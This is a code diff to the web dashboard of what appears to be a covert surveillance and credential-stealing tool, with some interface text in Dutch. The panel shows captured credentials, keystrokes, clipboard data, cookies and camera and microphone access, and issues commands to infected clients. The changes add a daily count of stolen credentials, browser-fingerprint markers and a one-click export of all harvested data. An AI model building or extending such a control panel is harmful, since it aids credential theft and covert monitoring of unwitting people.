@@ -380,6 +380,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="stat"><div id="s-clip" class="n">0</div><div class="l">Clipboard</div></div>
     <div class="stat"><div id="s-visit" class="n">0</div><div class="l">Visits</div></div>
     <div class="stat"><div id="s-cred" class="n" style="color:#f4b400">0</div><div class="l" style="color:#f4b400">Credentials</div></div>
+    <div class="stat" title="Credentials captured today"><div id="s-cred-today" class="n" style="color:#f4b400">0</div><div class="l" style="color:#f4b400">Creds Today</div></div>
     <div class="stat"><div id="s-err" class="n">0</div><div class="l">Errors</div></div>
 </div>
 
@@ -729,6 +730,9 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
                 <div>🎙 Microfoon: via knop in Cameras-tabblad</div>
                 <div>▶ Live Camera: via knop in Cameras-tabblad</div>
                 <div style="margin-top:6px;color:var(--text2)">Commands worden verstuurd via polling (3s).</div>
+            </div>
+            <div style="margin-top:10px">
+                <button class="cfg-btn secondary" onclick="exportAllData()">📤 Export All Data (JSON)</button>
             </div>
         </div>
         <div class="cfg-group">
@@ -1147,7 +1151,17 @@ $$('.tab').forEach(tab => {
         if (v === 'visits') loadVisits(true);
         if (v === 'credentials') loadCredentials();
         if (v === 'commands') updateCmdTargets();
-        if (v === 'timeline') loadTimeline();
+        if (v === 'timeline') {
+            // Auto-select the currently filtered client if one is selected
+            if (currentFilter) {
+                const tSel = $('#tl-client-sel');
+                if (tSel) {
+                    // Populate first, then set value
+                    loadTimeline().then ? loadTimeline() : loadTimeline();
+                    setTimeout(() => { const s2 = $('#tl-client-sel'); if (s2 && currentFilter) { s2.value = currentFilter; loadTimeline(); } }, 50);
+                } else { loadTimeline(); }
+            } else { loadTimeline(); }
+        }
         if (v === 'settings') { loadConfig(); loadStorage(); }
         if (v === 'errors')   { renderErrorLog(); loadClientErrors(); }
     });
@@ -1436,6 +1450,7 @@ async function refreshAll() {
                 $('#s-clip').textContent = stats.clipboardCount || 0;
                 $('#s-visit').textContent = stats.visitCount || 0;
                 $('#s-cred').textContent = stats.credentialCount || 0;
+                if ($('#s-cred-today')) $('#s-cred-today').textContent = stats.credentialCountToday || 0;
                 // Audio alert when new credentials are captured
                 const newCredCount = stats.credentialCount || 0;
                 if (prevCredentialCount >= 0 && newCredCount > prevCredentialCount) {
@@ -1580,7 +1595,8 @@ function renderKeystrokes(keys) {
         'MEDIA DEVICES': '#86efac', 'PAGE LOAD': '#bfdbfe',
         'SCROLL': '#6ee7b7', 'MOTION': '#f9a8d4',
         'COOKIES': '#fcd34d', 'PERF': '#67e8f9',
-        'FORM SUBMIT': '#f97316', 'RAGE CLICK': '#ef4444'
+        'FORM SUBMIT': '#f97316', 'RAGE CLICK': '#ef4444',
+        'NAVIGATOR': '#a5b4fc', 'FONTS': '#fda4af'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -1594,7 +1610,7 @@ function renderKeystrokes(keys) {
         let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         highlighted = colorizeMarker(highlighted);
-        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE)/.test(k.keys || '');
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS)/.test(k.keys || '');
         return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
             ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
@@ -2568,6 +2584,22 @@ async function downloadFullBackup() {
         URL.revokeObjectURL(url);
         toast(`⬇️ Backup saved as backup_${ts}.json`);
     } catch(e) { toast('❌ Backup failed: ' + e.message); }
+}
+
+async function exportAllData() {
+    try {
+        showToast('📤 Preparing export...');
+        const data = await api('/api/export');
+        if (!data) { showToast('❌ Export failed'); return; }
+        const ts = new Date().toISOString().slice(0, 19).replace(/[:.]/g, '-');
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `export_${ts}.json`;
+        a.click();
+        URL.revokeObjectURL(a.href);
+        toast(`⬇️ Exported all data as export_${ts}.json`);
+    } catch(e) { toast('❌ Export failed: ' + e.message); }
 }
 
 async function doCleanup(type, keep) {
